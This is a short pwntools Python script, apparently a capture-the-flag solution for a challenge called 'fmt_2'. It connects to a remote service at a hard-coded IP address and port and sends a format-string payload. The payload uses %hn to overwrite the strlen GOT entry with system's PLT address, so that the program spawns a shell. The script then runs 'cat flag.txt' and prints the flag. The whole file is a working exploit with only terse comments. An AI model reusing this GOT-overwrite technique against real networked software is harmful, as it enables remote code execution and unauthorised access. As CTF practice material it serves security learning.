from pwn import *
context.arch = 'amd64'

# c = process('./fmt_2')
c = connect('103.77.175.40', 6111)
exe = ELF('./fmt_2', checksec = False)

add_system = exe.plt['system'] #4198628 = 0x4010E4
add_pointer_strlen = exe.got['strlen'] #4210696 = 0x404008


# payload = b'AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p' RDI -> RSI -> RDX -> RCX -> R8 -> R9 -> [STACK]
payload = b'sh;#' #4bytes
payload += b'%4320c%8$hnA' + p64(add_pointer_strlen)
#            12bytes       +       8bytes
c.sendlineafter(b"Do you have anything to tell us?: ",payload)

c.sendline(b'cat flag.txt')
c.recvuntil(b'BKSEC')
flag = c.recvline()
print()
flag = b'BKSEC' + flag
print(flag)
